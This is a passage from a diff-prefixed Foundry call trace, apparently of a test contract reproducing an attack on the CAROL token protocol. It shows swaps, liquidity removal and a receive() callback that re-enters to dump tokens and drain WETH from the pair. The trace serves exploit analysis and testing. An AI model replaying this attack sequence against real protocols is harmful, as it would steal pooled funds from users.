+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 3451805642280058124496 [3.451e21], 238248306202285690064642 [2.382e23], 1701348645 [1.701e9]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [6139] CAROL::mint(CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], 2927235194430644552183 [2.927e21])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], value: 2927235194430644552183 [2.927e21])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 2: 0x0000000000000000000000000000000000000000002b3fb8ce906050e66cdfb6 → 0x0000000000000000000000000000000000000000002b40577e1ce47e7280e1ad
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x521cce8c5167e75a494c79b21498479bdd6870f3632c22c84023cf6a9fedbea7: 0x0000000000000000000000000000000000000000001c67da8ece31faa1be0c34 → 0x0000000000000000000000000000000000000000001c68793e5ab6282dd20e2b
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [22933] CAROL::increaseAllowance(Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], 2927235194430644552183 [2.927e21])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Approval(owner: CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], spender: Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], value: 2927235194430644552183 [2.927e21])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x091757392f20ba3d5f9f16821341a5def661a5349c547c810e2488538be770c5: 0 → 0x00000000000000000000000000000000000000000000009eaf8c842d8c1401f7
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [128099] Router::swapExactTokensForETH(2927235194430644552183 [2.927e21], 0, [0x4A0a76645941d8C7ba059940B3446228F0DB8972, 0x4200000000000000000000000000000000000006], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1701348945 [1.701e9])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [564] 0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB::getPair(CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [564] 0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB::getPair(CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [504] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 3451805642280058124496 [3.451e21], 238248306202285690064642 [2.382e23], 1701348645 [1.701e9]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [564] 0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB::getPair(CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [6217] CAROL::transferFrom(CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], 0x0C477c729816228AF3Cb4E014cbF9412aA080b86, 2927235194430644552183 [2.927e21])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Approval(owner: CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], spender: Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], value: 0)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], to: 0x0C477c729816228AF3Cb4E014cbF9412aA080b86, value: 2927235194430644552183 [2.927e21])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x091757392f20ba3d5f9f16821341a5def661a5349c547c810e2488538be770c5: 0x00000000000000000000000000000000000000000000009eaf8c842d8c1401f7 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x20a203404b67e0312c7a90e1660205432bf696d6e6e5fe47d0405e0ec8ca36ee: 0x0000000000000000000000000000000000000000000032737770655a65980f02 → 0x00000000000000000000000000000000000000000000331226fce987f1ac10f9
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x521cce8c5167e75a494c79b21498479bdd6870f3632c22c84023cf6a9fedbea7: 0x0000000000000000000000000000000000000000001c68793e5ab6282dd20e2b → 0x0000000000000000000000000000000000000000001c67da8ece31faa1be0c34
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [564] 0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB::getPair(CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [36116] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86::swap(41792348115915993917 [4.179e19], 0, Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], 0x)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [22901] WETH::transfer(Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], 41792348115915993917 [4.179e19])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0C477c729816228AF3Cb4E014cbF9412aA080b86, to: Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], value: 41792348115915993917 [4.179e19])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xb43f40c8706b3e5fd796f26df512a1f05fe7d0c9a8faec1d26f3618f4c30975c: 0x0000000000000000000000000000000000000000000000bb1f6d1f341ff278d0 → 0x0000000000000000000000000000000000000000000000b8db70e0047d4f0593
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x75c122d25f7add48cfdfe9fae5685ca03de064ba48b95b58615af667cc61d819: 0 → 0x00000000000000000000000000000000000000000000000243fc3f2fa2a3733d
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [457] WETH::balanceOf(0x0C477c729816228AF3Cb4E014cbF9412aA080b86) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 3410013294164142130579 [3.41e21]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [651] CAROL::balanceOf(0x0C477c729816228AF3Cb4E014cbF9412aA080b86) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 241175541396716334616825 [2.411e23]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Sync(reserve0: 3410013294164142130579 [3.41e21], reserve1: 241175541396716334616825 [2.411e23])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Swap(sender: Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], amount0In: 0, amount1In: 2927235194430644552183 [2.927e21], amount0Out: 41792348115915993917 [4.179e19], amount1Out: 0, to: Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 8: 0x656885250000000032737770655a65980f020000000000bb1f6d1f341ff278d0 → 0x6568852500000000331226fce987f1ac10f90000000000b8db70e0047d4f0593
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [9147] WETH::withdraw(41792348115915993917 [4.179e19])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [83] Router::fallback{value: 41792348115915993917}()
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Withdrawal(src: Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], wad: 41792348115915993917 [4.179e19])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x75c122d25f7add48cfdfe9fae5685ca03de064ba48b95b58615af667cc61d819: 0x00000000000000000000000000000000000000000000000243fc3f2fa2a3733d → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [58274] ContractTest::receive{value: 41792348115915993917}()
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [651] CAROL::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 15597126006409689141027309 [1.559e25]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [50677] Router::swapExactTokensForTokens(14037413405768720226924578 [1.403e25], 0, [0x4A0a76645941d8C7ba059940B3446228F0DB8972, 0x4200000000000000000000000000000000000006], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1701352645 [1.701e9])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [564] 0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB::getPair(CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [564] 0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB::getPair(CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [504] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 3410013294164142130579 [3.41e21], 241175541396716334616825 [2.411e23], 1701348645 [1.701e9]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [564] 0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB::getPair(CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [3992] CAROL::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0C477c729816228AF3Cb4E014cbF9412aA080b86, 14037413405768720226924578 [1.403e25])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0C477c729816228AF3Cb4E014cbF9412aA080b86, value: 14037413405768720226924578 [1.403e25])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000000ce6d1e520f25d09b721ed → 0x000000000000000000000000000000000000000000014a4830834b6fb42be9cb
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x20a203404b67e0312c7a90e1660205432bf696d6e6e5fe47d0405e0ec8ca36ee: 0x00000000000000000000000000000000000000000000331226fce987f1ac10f9 → 0x0000000000000000000000000000000000000000000bcf9bdb9a90754737491b
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [564] 0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB::getPair(CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [36116] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86::swap(3352273829341354684064 [3.352e21], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [22901] WETH::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3352273829341354684064 [3.352e21])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0C477c729816228AF3Cb4E014cbF9412aA080b86, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 3352273829341354684064 [3.352e21])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xb43f40c8706b3e5fd796f26df512a1f05fe7d0c9a8faec1d26f3618f4c30975c: 0x0000000000000000000000000000000000000000000000b8db70e0047d4f0593 → 0x000000000000000000000000000000000000000000000003214bc956eb6896f3
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x0000000000000000000000000000000000000000000000b5ba2516ad91e66ea0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [457] WETH::balanceOf(0x0C477c729816228AF3Cb4E014cbF9412aA080b86) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 57739464822787446515 [5.773e19]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [651] CAROL::balanceOf(0x0C477c729816228AF3Cb4E014cbF9412aA080b86) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 14278588947165436561541403 [1.427e25]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Sync(reserve0: 57739464822787446515 [5.773e19], reserve1: 14278588947165436561541403 [1.427e25])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Swap(sender: Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], amount0In: 0, amount1In: 14037413405768720226924578 [1.403e25], amount0Out: 3352273829341354684064 [3.352e21], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 8: 0x6568852500000000331226fce987f1ac10f90000000000b8db70e0047d4f0593 → 0x656885250000000bcf9bdb9a90754737491b000000000003214bc956eb6896f3
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] [14037413405768720226924578 [1.403e25], 3352273829341354684064 [3.352e21]]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] [2927235194430644552183 [2.927e21], 41792348115915993917 [4.179e19]]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [504] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86::getReserves() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 57739464822787446515 [5.773e19], 14278588947165436561541403 [1.427e25], 1701348645 [1.701e9]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [388] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86::totalSupply() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 28326881457823205641544 [2.832e22]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [24442] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86::approve(Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], 21528416296980248144757 [2.152e22])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Approval(owner: CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], spender: Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], value: 21528416296980248144757 [2.152e22])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x1a3068b41480c93c6921de0c661338a57fcfaf8889423b0b408ba36239b2a379: 0 → 0x00000000000000000000000000000000000000000000048f0ecb0faa5e222b75
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [140967] Router::removeLiquidityETH(CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], 21528416296980248144757 [2.152e22], 0, 0, CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], 1701348945 [1.701e9])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [564] 0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB::getPair(CAROL: [0x4A0a76645941d8C7ba059940B3446228F0DB8972], WETH: [0x4200000000000000000000000000000000000006]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [25849] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86::transferFrom(CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], 0x0C477c729816228AF3Cb4E014cbF9412aA080b86, 21528416296980248144757 [2.152e22])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], to: 0x0C477c729816228AF3Cb4E014cbF9412aA080b86, value: 21528416296980248144757 [2.152e22])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x1a3068b41480c93c6921de0c661338a57fcfaf8889423b0b408ba36239b2a379: 0x00000000000000000000000000000000000000000000048f0ecb0faa5e222b75 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x42dea04b1e5c24a307a4ee79d08fe65bdccc72db41b646fe2a12cf752eb560a0: 0 → 0x00000000000000000000000000000000000000000000048f0ecb0faa5e222b75
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xc960b16574e6a744e218eb8dfcd4ffbde2f00db7cf526a61338bc37fa09f430c: 0x0000000000000000000000000000000000000000000005f50b9eb23627403d03 → 0x000000000000000000000000000000000000000000000165fcd3a28bc91e118e
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [88258] 0x0C477c729816228AF3Cb4E014cbF9412aA080b86::burn(Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [457] WETH::balanceOf(0x0C477c729816228AF3Cb4E014cbF9412aA080b86) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 57739464822787446515 [5.773e19]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [651] CAROL::balanceOf(0x0C477c729816228AF3Cb4E014cbF9412aA080b86) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 14278588947165436561541403 [1.427e25]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [314] 0xFDa619b6d20975be80A10332cD39b9a4b0FAa8BB::feeTo() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0xAF1823bACd8EDDA3b815180a61F8741fA4aBc6Dd
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0xAF1823bACd8EDDA3b815180a61F8741fA4aBc6Dd, value: 22455040113952638153 [2.245e19])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0C477c729816228AF3Cb4E014cbF9412aA080b86, to: 0x0000000000000000000000000000000000000000, value: 21528416296980248144757 [2.152e22])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [22901] WETH::transfer(Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], 43847207343292315416 [4.384e19])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0C477c729816228AF3Cb4E014cbF9412aA080b86, to: Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], value: 43847207343292315416 [4.384e19])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xb43f40c8706b3e5fd796f26df512a1f05fe7d0c9a8faec1d26f3618f4c30975c: 0x000000000000000000000000000000000000000000000003214bc956eb6896f3 → 0x000000000000000000000000000000000000000000000000c0cb3692c1921fdb
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x75c122d25f7add48cfdfe9fae5685ca03de064ba48b95b58615af667cc61d819: 0 → 0x000000000000000000000000000000000000000000000002608092c429d67718
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [25410] CAROL::transfer(Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], 10843125270688648356602531 [1.084e25])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0C477c729816228AF3Cb4E014cbF9412aA080b86, to: Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], value: 10843125270688648356602531 [1.084e25])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x5756c5f9c5a6dacf257b7bcc4dd751ec33a950ddcd3d66ef40ae0387fbd9562e: 0 → 0x00000000000000000000000000000000000000000008f81effae1f7958baa2a3
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x20a203404b67e0312c7a90e1660205432bf696d6e6e5fe47d0405e0ec8ca36ee: 0x0000000000000000000000000000000000000000000bcf9bdb9a90754737491b → 0x00000000000000000000000000000000000000000002d77cdbec70fbee7ca678
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [457] WETH::balanceOf(0x0C477c729816228AF3Cb4E014cbF9412aA080b86) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 13892257479495131099 [1.389e19]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [651] CAROL::balanceOf(0x0C477c729816228AF3Cb4E014cbF9412aA080b86) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 3435463676476788204938872 [3.435e24]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Sync(reserve0: 13892257479495131099 [1.389e19], reserve1: 3435463676476788204938872 [3.435e24])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Burn(sender: Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], amount0: 43847207343292315416 [4.384e19], amount1: 10843125270688648356602531 [1.084e25], to: Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 8: 0x656885250000000bcf9bdb9a90754737491b000000000003214bc956eb6896f3 → 0x6568852500000002d77cdbec70fbee7ca678000000000000c0cb3692c1921fdb
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x42dea04b1e5c24a307a4ee79d08fe65bdccc72db41b646fe2a12cf752eb560a0: 0x00000000000000000000000000000000000000000000048f0ecb0faa5e222b75 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0: 0x0000000000000000000000000000000000000000000005ff9a733ba3d7814d48 → 0x000000000000000000000000000000000000000000000171c3487ffc7aaa669c
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 11: 0x0000000000000000000000000024c94a77fdb54147111d808ea0f4784c55ca30 → 0x000000000000000000000000000223df20091ae838da522672c9666d853af0a8
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0xc3e33f1e9f412f3c97c5a37666655e01fa6f390564c94c2be9da409fd5a9bd9e: 0x00000000000000000000000000000000000000000000000a7f67bd45a399f7eb → 0x00000000000000000000000000000000000000000000000bb7081148a4e53cb4
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 43847207343292315416 [4.384e19], 10843125270688648356602531 [1.084e25]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [6310] CAROL::transfer(CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], 10843125270688648356602531 [1.084e25])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], to: CAROLProtocol: [0x26fe408BbD7A490fEB056DA8e2D1e007938E5685], value: 10843125270688648356602531 [1.084e25])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x521cce8c5167e75a494c79b21498479bdd6870f3632c22c84023cf6a9fedbea7: 0x0000000000000000000000000000000000000000001c67da8ece31faa1be0c34 → 0x000000000000000000000000000000000000000000255ff98e7c5173fa78aed7
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x5756c5f9c5a6dacf257b7bcc4dd751ec33a950ddcd3d66ef40ae0387fbd9562e: 0x00000000000000000000000000000000000000000008f81effae1f7958baa2a3 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [9147] WETH::withdraw(43847207343292315416 [4.384e19])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [83] Router::fallback{value: 43847207343292315416}()
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Withdrawal(src: Router: [0x327Df1E6de05895d2ab08513aaDD9313Fe505d86], wad: 43847207343292315416 [4.384e19])
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
